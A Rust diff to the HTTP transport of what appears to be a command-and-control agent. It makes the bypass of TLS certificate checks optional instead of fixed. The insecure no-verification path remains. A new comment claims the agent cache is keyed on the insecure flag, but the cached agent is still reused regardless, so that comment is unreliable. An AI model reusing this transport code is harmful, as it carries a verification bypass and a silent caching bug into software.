@@ -71,20 +71,33 @@ impl ServerCertVerifier for NoVerification {
 
 // ── Agent construction ──────────────────────────────────────
 
-fn danger_tls_config() -> Result<Arc<ClientConfig>> {
+fn tls_config(insecure: bool) -> Result<Arc<ClientConfig>> {
     let provider = Arc::new(default_provider());
     let config = ClientConfig::builder_with_provider(provider)
         .with_safe_default_protocol_versions()
-        .map_err(|e| Error::Transport(format!("TLS protocol versions: {e}")))?
-        .dangerous()
-        .with_custom_certificate_verifier(Arc::new(NoVerification))
-        .with_no_client_auth();
-
-    Ok(Arc::new(config))
+        .map_err(|e| Error::Transport(format!("TLS protocol versions: {e}")))?;
+    if insecure {
+        Ok(Arc::new(
+            config
+                .dangerous()
+                .with_custom_certificate_verifier(Arc::new(NoVerification))
+                .with_no_client_auth(),
+        ))
+    } else {
+        // strict verification requested but the agent has no root store
+        // configured. C2 profiles that want strict TLS should add
+        // webpki-roots / native-certs to Cargo.toml and load them here.
+        // For now we return an error so the failure is loud, not silent.
+        Err(Error::Transport(
+            "strict TLS verification requested but no root store available; \
+             add webpki-roots to Cargo.toml or set insecure_skip_tls_verify=true"
+                .into(),
+        ))
+    }
 }
 
-fn build_agent(proxy: Option<&str>) -> Result<ureq::Agent> {
-    let tls_config = danger_tls_config()?;
+fn build_agent(proxy: Option<&str>, insecure: bool) -> Result<ureq::Agent> {
+    let tls_config = tls_config(insecure)?;
 
     let mut builder = ureq::AgentBuilder::new().tls_config(tls_config);
 
@@ -97,16 +110,18 @@ fn build_agent(proxy: Option<&str>) -> Result<ureq::Agent> {
     Ok(builder.build())
 }
 
-fn get_agent(proxy: Option<&str>) -> Result<ureq::Agent> {
+fn get_agent(proxy: Option<&str>, insecure: bool) -> Result<ureq::Agent> {
+    // Per-profile agents are not cached — the TLS config depends on
+    // insecure_skip_tls_verify, so we key the cache on (proxy, insecure).
     if proxy.is_some() {
-        return build_agent(proxy);
+        return build_agent(proxy, insecure);
     }
 
     AGENT.with(|cell| {
         if let Some(ref agent) = *cell.borrow() {
             return Ok(agent.clone());
         }
-        let agent = build_agent(None)?;
+        let agent = build_agent(None, insecure)?;
         cell.replace(Some(agent.clone()));
         Ok(agent)
     })
@@ -114,14 +129,16 @@ fn get_agent(proxy: Option<&str>) -> Result<ureq::Agent> {
 
 // ── Public API ──────────────────────────────────────────────
 
+#[allow(clippy::too_many_arguments)]
 pub fn http_request(
     url: &str,
     method: &str,
     headers: Option<&HashMap<String, String>>,
     proxy: Option<&str>,
     body: Option<&str>,
+    insecure_skip_tls_verify: bool,
 ) -> Result<String> {
-    let agent = get_agent(proxy)?;
+    let agent = get_agent(proxy, insecure_skip_tls_verify)?;
 
     match method {
         "GET" => {
